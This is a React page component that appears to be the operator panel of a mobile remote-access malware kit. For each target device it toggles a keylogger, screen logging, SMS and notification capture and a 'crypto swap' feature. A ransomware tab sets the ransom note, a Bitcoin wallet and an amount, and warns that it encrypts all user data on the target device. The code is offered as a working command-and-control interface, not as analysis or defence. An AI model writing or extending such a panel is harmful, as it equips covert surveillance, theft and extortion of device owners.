import { useEffect, useState } from 'react'
import { useParams } from 'react-router-dom'
import PageHeader from '../components/PageHeader'
import { toolkit, ransomware } from '../utils/api'
import { Wrench, Save, AlertTriangle, Bitcoin } from 'lucide-react'

export default function ToolkitPage() {
  const { deviceId } = useParams()
  const [activeTab, setActiveTab] = useState('config')
  const [config, setConfig] = useState({})
  const [ransomConfig, setRansomConfig] = useState({ title: '', body: '', walletAddress: '', amount: 0.5, currency: 'BTC' })

  useEffect(() => { if (deviceId) loadConfig() }, [deviceId])

  const loadConfig = async () => {
    const data = await toolkit.getConfig(deviceId)
    if (data) setConfig(data)
    const r = await ransomware.get(deviceId)
    if (r) setRansomConfig(r)
  }

  const saveConfig = async () => {
    await toolkit.setConfig(deviceId, config)
  }

  const saveRansomware = async () => {
    await ransomware.set(deviceId, ransomConfig)
  }

  const features = [
    { id: 'keylogger', label: 'Keylogger' },
    { id: 'notification_logs', label: 'Notification Logs' },
    { id: 'screenlogger', label: 'Screenlogger' },
    { id: 'sms_logs', label: 'SMS Logs' },
    { id: 'crypto_swap', label: 'Crypto Swap' },
    { id: 'show_notifications', label: 'Show Notifications' },
  ]

  return (
    <div className="animate-fade-in">
      <PageHeader title="Toolkit" icon={Wrench} onDeviceChange={() => {}} />

      <div className="flex gap-2 mb-6">
        {['config', 'addresses', 'ransomware'].map(tab => (
          <button
            key={tab}
            onClick={() => setActiveTab(tab)}
            className={`px-4 py-2 rounded text-xs font-mono uppercase tracking-wider border transition-all
              ${activeTab === tab ? 'bg-wuzen-primary/10 border-wuzen-primary text-wuzen-primary' : 'border-wuzen-border text-wuzen-muted'}`}
          >
            {tab}
          </button>
        ))}
      </div>

      {activeTab === 'config' && (
        <div className="wuzen-panel p-6">
          <h3 className="text-sm font-semibold uppercase tracking-wider text-wuzen-muted mb-4">Feature Toggles</h3>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
            {features.map(f => (
              <div key={f.id} className="flex items-center justify-between p-4 rounded-lg bg-wuzen-card border border-wuzen-border">
                <span className="text-sm">{f.label}</span>
                <button
                  onClick={() => setConfig(p => ({ ...p, [f.id]: !p[f.id] }))}
                  className={`w-12 h-6 rounded-full relative transition-colors ${config[f.id] ? 'bg-wuzen-success' : 'bg-wuzen-border'}`}
                >
                  <div className={`absolute top-0.5 w-5 h-5 rounded-full bg-white transition-transform ${config[f.id] ? 'translate-x-6' : 'translate-x-0.5'}`} />
                </button>
              </div>
            ))}
          </div>
          <button onClick={saveConfig} className="wuzen-btn-success">
            <Save className="w-4 h-4" /> SAVE CONFIG
          </button>
        </div>
      )}

      {activeTab === 'ransomware' && (
        <div className="wuzen-panel p-6 max-w-2xl">
          <div className="flex items-center gap-2 mb-4 p-3 rounded bg-wuzen-danger/10 border border-wuzen-danger/30">
            <AlertTriangle className="w-4 h-4 text-wuzen-danger" />
            <span className="text-xs text-wuzen-danger">WARNING: This feature will encrypt all user data on the target device. Use with extreme caution.</span>
          </div>

          <div className="space-y-4">
            <div>
              <label className="text-xs text-wuzen-muted uppercase mb-1 block">Ransom Message Title</label>
              <input className="wuzen-input w-full" value={ransomConfig.title} onChange={e => setRansomConfig(p => ({...p, title: e.target.value}))} />
            </div>
            <div>
              <label className="text-xs text-wuzen-muted uppercase mb-1 block">Ransom Message Body</label>
              <textarea className="wuzen-input w-full h-24" value={ransomConfig.body} onChange={e => setRansomConfig(p => ({...p, body: e.target.value}))} />
            </div>
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="text-xs text-wuzen-muted uppercase mb-1 block">Ransom Wallet</label>
                <div className="relative">
                  <Bitcoin className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-wuzen-muted" />
                  <input className="wuzen-input w-full pl-10 font-mono text-xs" value={ransomConfig.walletAddress} onChange={e => setRansomConfig(p => ({...p, walletAddress: e.target.value}))} placeholder="bc1q..." />
                </div>
              </div>
              <div>
                <label className="text-xs text-wuzen-muted uppercase mb-1 block">Amount</label>
                <input type="number" step="0.01" className="wuzen-input w-full" value={ransomConfig.amount} onChange={e => setRansomConfig(p => ({...p, amount: parseFloat(e.target.value)}))} />
              </div>
            </div>
            <button onClick={saveRansomware} className="wuzen-btn-danger">
              <Save className="w-4 h-4" /> SAVE RANSOMWARE CONFIG
            </button>
          </div>
        </div>
      )}
    </div>
  )
}
